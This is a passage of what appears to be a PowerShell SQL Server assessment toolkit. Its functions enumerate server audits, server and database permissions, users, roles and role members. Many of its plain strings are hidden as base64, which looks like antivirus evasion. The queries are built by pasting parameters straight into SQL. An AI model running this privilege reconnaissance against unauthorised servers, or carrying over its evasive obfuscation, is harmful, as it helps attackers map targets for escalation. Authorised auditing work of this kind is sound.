        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblAuditServerSpec = New-Object -TypeName System.Data.DataTable
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_name as [AuditAction],
            s.is_state_enabled,
            d.is_group,
            d.audit_action_id as [AuditActionId],
            s.create_date,
            s.modify_date
            FROM sys.server_audits AS a
            JOIN sys.server_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.server_audit_specification_details AS d
            ON s.server_specification_id = d.server_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
        $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults
    }
    End
    {
        $TblAuditServerSpec
    }
}
Function  Get-SQLServerPriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name.')]
        [string]$PermissionName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerPrivs = New-Object -TypeName System.Data.DataTable
        if($PermissionName)
        {
            $PermissionNameFilter = " WHERE PER.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            GRE.name as [GranteeName],
            GRO.name as [GrantorName],
            PER.class_desc as [PermissionClass],
            PER.permission_name as [PermissionName],
            PER.state_desc as [PermissionState],
            COALESCE(PRC.name, EP.name, N'') as [ObjectName],
            COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
            FROM [sys].[server_permissions] as PER
            INNER JOIN sys.server_principals as GRO
            ON PER.grantor_principal_id = GRO.principal_id
            INNER JOIN sys.server_principals as GRE
            ON PER.grantee_principal_id = GRE.principal_id
            LEFT JOIN sys.server_principals as PRC
            ON PER.class = 101 AND PER.major_id = PRC.principal_id
            LEFT JOIN sys.endpoints AS EP
            ON PER.class = 105 AND PER.major_id = EP.endpoint_id
            $PermissionNameFilter
        ORDER BY GranteeName,PermissionName;"
        $TblServerPrivsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServerPrivs = $TblServerPrivs + $TblServerPrivsTemp
    }
    End
    {
        $TblServerPrivs
    }
}
Function  Get-SQLDatabasePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name to filter for.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name to filter for.')]
        [string]$PermissionName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission type to filter for.')]
        [string]$PermissionType,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name for grantee to filter for.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Don't select permissions for default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDatabasePrivs = New-Object -TypeName System.Data.DataTable
        if($PermissionName)
        {
            $PermissionNameFilter = " and pm.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and rp.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
        if($PermissionType)
        {
            $PermissionTypeFilter = " and pm.class_desc like '$PermissionType'"
        }
        else
        {
            $PermissionTypeFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                rp.name as [PrincipalName],
                rp.type_desc as [PrincipalType],
                pm.class_desc as [PermissionType],
                pm.permission_name as [PermissionName],
                pm.state_desc as [StateDescription],
                ObjectType = CASE
                WHEN obj.type_desc IS NULL
                OR obj.type_desc = 'SYSTEM_TABLE' THEN
                pm.class_desc
                ELSE
                obj.type_desc
                END,
                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id))
                FROM   $DbName.sys.database_principals rp
                INNER JOIN $DbName.sys.database_permissions pm
                ON pm.grantee_principal_id = rp.principal_id
                LEFT JOIN $DbName.sys.schemas ss
                ON pm.major_id = ss.schema_id
                LEFT JOIN $DbName.sys.objects obj
                ON pm.[major_id] = obj.[object_id] WHERE 1=1
                $PermissionTypeFilter
                $PermissionNameFilter
            $PrincipalNameFilter"
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing permissions for the $DbName database..."
            }
            $TblDatabaseTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblDatabasePrivs = $TblDatabasePrivs + $TblDatabaseTemp
        }
    }
    End
    {
        $TblDatabasePrivs
    }
}
Function  Get-SQLDatabaseUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database user.')]
        [string]$DatabaseUser,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server login.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDatabaseUsers = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAFUAcwBlAHIASQBkAA=='))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAFUAcwBlAHIA'))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA='))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGEAdQBsAHQAXwBzAGMAaABlAG0AYQBfAG4AYQBtAGUA'))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblDatabaseUsers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and b.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
        if($DatabaseUser)
        {
            $DatabaseUserFilter = " and a.name like '$DatabaseUser'"
        }
        else
        {
            $DatabaseUserFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing database users from $DbName."
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                a.principal_id as [DatabaseUserId],
                a.name as [DatabaseUser],
                a.sid as [PrincipalSid],
                b.name as [PrincipalName],
                a.type_desc as [PrincipalType],
                default_schema_name,
                a.create_date,
                a.is_fixed_role
                FROM    [sys].[database_principals] a
                LEFT JOIN [sys].[server_principals] b
                ON a.sid = b.sid WHERE 1=1
                $DatabaseUserFilter
            $PrincipalNameFilter"
            $TblDatabaseUsersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblDatabaseUsersTemp |
            % -Process {
                if($_.PrincipalSid.GetType() -eq [System.DBNull])
                {
                    $Sid = ''
                }
                else
                {
                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                    if ($NewSid.length -le 10)
                    {
                        $Sid = [Convert]::ToInt32($NewSid,16)
                    }
                    else
                    {
                        $Sid = $NewSid
                    }
                }
                $null = $TblDatabaseUsers.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.DatabaseUserId,
                    [string]$_.DatabaseUser,
                    $Sid,
                    [string]$_.PrincipalName,
                    [string]$_.PrincipalType,
                    [string]$_.default_schema_name,
                    [string]$_.create_date,
                [string]$_.is_fixed_role)
            }
        }
    }
    End
    {
        $TblDatabaseUsers
    }
}
Function  Get-SQLServerRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQA'))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZAA='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAEkAZAA='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABpAHMAYQBiAGwAZQBkAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBEAGEAdABlAA=='))))
        $null = $TblServerRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdABfAGQAYQB0AGEAYgBhAHMAZQBfAG4AYQBtAGUA'))))
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }
        if ($RolePrincipalName)
        {
            $PrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "SELECT   '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            principal_id as [RolePrincipalId],
            sid as [RolePrincipalSid],
            name as [RolePrincipalName],
            type_desc as [RolePrincipalType],
            owning_principal_id as [OwnerPrincipalId],
            suser_name(owning_principal_id) as [OwnerPrincipalName],
            is_disabled,
            is_fixed_role,
            create_date,
            modify_Date,
            default_database_name
            FROM [master].[sys].[server_principals] WHERE type like 'R'
            $PrincipalNameFilter
        $RoleOwnerFilter"
        $TblServerRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServerRolesTemp |
        % -Process {
            $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }
            $null = $TblServerRoles.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                $Sid,
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
            [string]$_.default_database_name)
        }
    }
    End
    {
        $TblServerRoles
    }
}
Function  Get-SQLServerRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerRoleMembers = New-Object -TypeName System.Data.DataTable
        if ($RolePrincipalName)
        {
            $RoleOwnerFilter = " AND SUSER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND SUSER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
            SUSER_NAME(role_principal_id) as [RolePrincipalName],
            member_principal_id as [PrincipalId],
            SUSER_NAME(member_principal_id) as [PrincipalName]
            FROM sys.server_role_members WHERE 1=1
            $PrincipalNameFilter
        $RoleOwnerFilter"
        $TblServerRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServerRoleMembers = $TblServerRoleMembers + $TblServerRoleMembersTemp
    }
    End
    {
        $TblServerRoleMembers
    }
}
Function  Get-SQLDatabaseRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDatabaseRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQA'))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZAA='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAA=='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAEkAZAA='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBEAGEAdABlAA=='))))
        $null = $TblDatabaseRoles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdABfAHMAYwBoAGUAbQBhAF8AbgBhAG0AZQA='))))
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }
        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
